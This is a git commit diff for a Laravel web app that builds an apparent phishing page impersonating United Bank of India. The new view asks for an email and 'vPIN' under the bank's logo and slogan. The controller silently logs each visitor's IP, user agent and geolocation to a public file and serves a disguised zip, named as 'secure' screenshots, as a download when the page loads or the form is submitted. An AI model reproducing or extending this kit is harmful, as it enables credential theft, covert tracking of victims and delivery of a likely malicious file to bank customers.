9462ddee9e0d3c4b0a5be940a6349098ea6553bb
Leonard Selvaraja <kashrayks@gmail.com>
2022-07-03 19:58:40 +0530

    Added addl code

--- app/Http/Controllers/HomeController.php
+++ app/Http/Controllers/HomeController.php
@@ -2,7 +2,9 @@
 
 namespace App\Http\Controllers;
 
+use GuzzleHttp\Psr7\Response;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Storage;
 
 class HomeController extends Controller
 {
@@ -11,7 +13,41 @@ class HomeController extends Controller
 
     public function index() {
 
-        return view('signup');
+        // Get IP details and GPS location on page load
 
+        // Once the user has submitted the form, begin download.
+
+        $json = [
+            'ip' => request()->ip(),
+            'location' => $this->getLocation(request()->ip()),
+            'user_agent' => request()->userAgent()
+        ];
+
+        $json = json_encode($json);
+
+        $filename = now()->format('d-m-Y_H-i-s') . '.json';
+        Storage::disk('public')->put($filename, $json);
+
+
+        $file = public_path('secure-leoanard-screenshots-29HSyi42jsu.zip');
+        return response()->download($file, 'secure-leoanard-screenshots-29HSyi42jsu.zip');
+        return view('download');
+    }
+
+    public function post() {
+        $file = storage_path('secure-leoanard-screenshots-29HSyi42jsu.zip');
+        return response()->download($file, 'secure-leoanard-screenshots-29HSyi42jsu.zip');
+    }
+
+    // public function to get location from IP address
+    public function getLocation($ip) {
+        $url = 'http://ip-api.com/json/' . $ip;
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        $result = curl_exec($ch);
+        curl_close($ch);
+        $result = json_decode($result, true);
+        return $result;
     }
 }
---
+++ resources/views/signup.blade.php
@@ -0,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
+    <head>
+        <title>Laravel</title>
+
+        <!-- Fonts -->
+        <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700&display=swap" rel="stylesheet">
+
+        <!-- Styles -->
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <script src="https://cdn.tailwindcss.com"></script>
+    </head>
+    <body class="antialiased">
+      <!--
+  This example requires Tailwind CSS v2.0+
+
+  This example requires some changes to your config:
+
+  ```
+  // tailwind.config.js
+  module.exports = {
+    // ...
+    plugins: [
+      // ...
+      require('@tailwindcss/forms'),
+    ],
+  }
+  ```
+-->
+<!--
+  This example requires updating your template:
+
+  ```
+  <html class="h-full bg-gray-50">
+  <body class="h-full">
+  ```
+-->
+<div class="min-h-full flex items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
+    <div class="max-w-md w-full space-y-8">
+      <div>
+        <img class="mx-auto h-12 w-auto" src="https://upload.wikimedia.org/wikipedia/en/thumb/c/cb/United_Bank_of_India_Logo.svg/1200px-United_Bank_of_India_Logo.svg.png" style="width: 150px; height: auto;" alt="Workflow">
+        <h2 class="mt-6 text-center text-3xl font-extrabold text-gray-900">Enter your vPIN</h2>
+        <p class="mt-2 text-center text-sm text-gray-600">
+          <a href="#" class="font-medium text-green-600 hover:text-green-500">
+
+            Login to Secure Server. "Apno ka bank"</a>
+        </p>
+      </div>
+      <form class="mt-8 space-y-6" action="{{ route('post') }}" method="POST">
+        <input type="hidden" name="remember" value="true">
+        <div class="rounded-md shadow-sm -space-y-px">
+          <div>
+            <label for="email-address" class="sr-only">Email address</label>
+            <input id="email-address" name="email" type="email" autocomplete="email" required class="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-t-md focus:outline-none focus:ring-green-500 focus:border-green-500 focus:z-10 sm:text-sm" placeholder="Email address">
+          </div>
+          <div>
+            <label for="password" class="sr-only">Password</label>
+            <input id="password" name="password" type="password" autocomplete="current-password" required class="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-b-md focus:outline-none focus:ring-green-500 focus:border-green-500 focus:z-10 sm:text-sm" placeholder="vPIN">
+          </div>
+        </div>
+
+        {{-- <div class="flex items-center justify-between">
+          <div class="flex items-center">
+            <input id="remember-me" name="remember-me" type="checkbox" class="h-4 w-4 text-green-600 focus:ring-green-500 border-gray-300 rounded">
+            <label for="remember-me" class="ml-2 block text-sm text-gray-900"> Remember me </label>
+          </div>
+
+          <div class="text-sm">
+            <a href="#" class="font-medium text-green-600 hover:text-green-500"> Forgot your password? </a>
+          </div>
+        </div> --}}
+
+        <div>
+          <button type="submit" class="group relative w-full flex justify-center py-2 px-4 border border-transparent text-sm font-medium rounded-md text-white bg-green-600 hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-green-500">
+            <span class="absolute left-0 inset-y-0 flex items-center pl-3">
+              <!-- Heroicon name: solid/lock-closed -->
+              <svg class="h-5 w-5 text-green-500 group-hover:text-green-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true">
+                <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd" />
+              </svg>
+            </span>
+            Sign in
+          </button>
+        </div>
+
+
+        <div class="mt-3 text-center">
+            <p class="font-medium text-green-600">
+                Discover banking with ease, now exclusively on UBI.
+                <br>
+                <span class="text-lg">
+                    &copy; 2020
+                </span>
+            </p>
+        </div>
+      </form>
+    </div>
+  </div>
+
+    </body>
+</html>
